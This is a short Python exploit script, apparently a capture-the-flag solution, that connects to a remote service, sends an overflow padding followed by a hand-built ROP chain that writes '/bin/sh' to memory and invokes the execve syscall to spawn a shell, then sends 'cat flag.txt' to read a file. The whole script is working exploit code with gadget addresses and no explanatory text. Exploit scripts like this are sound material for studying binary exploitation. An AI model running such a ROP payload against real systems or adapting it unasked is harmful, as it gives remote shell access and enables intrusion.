import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 2113

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res.decode('ascii'))
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

# gadgets
pop_rsi     = 0x401617
sh_addr     = 0x6ca088
pop_rax     = 0x44f6cc
sh_str      = b'/bin/sh\x00'
mov_rsi_rax = 0x4741d1
pop_rdi     = 0x4014f6
pop_rdx     = 0x4429f6
syscall     = 0x4003da

# payload
pad  = b'A'*0x20 + b'\x00' + b'B'*7
rop  = b''
rop += pop_rsi.to_bytes(8, 'little')
rop += sh_addr.to_bytes(8, 'little')
rop += pop_rax.to_bytes(8, 'little')
rop += sh_str
rop += mov_rsi_rax.to_bytes(8, 'little')
rop += pop_rdi.to_bytes(8, 'little')
rop += sh_addr.to_bytes(8, 'little')
rop += pop_rsi.to_bytes(8, 'little')
rop += (0).to_bytes(8, 'little')
rop += pop_rdx.to_bytes(8, 'little')
rop += (0).to_bytes(8, 'little')
rop += pop_rax.to_bytes(8, 'little')
rop += (59).to_bytes(8, 'little')
rop += syscall.to_bytes(8, 'little')

payload = pad + rop

assert len(payload) <= 0xc8

with open('payload', 'wb') as f:
	f.write(payload)

recv()
send(payload)
#recv()

#interact()
send(b'cat flag.txt')
recv()


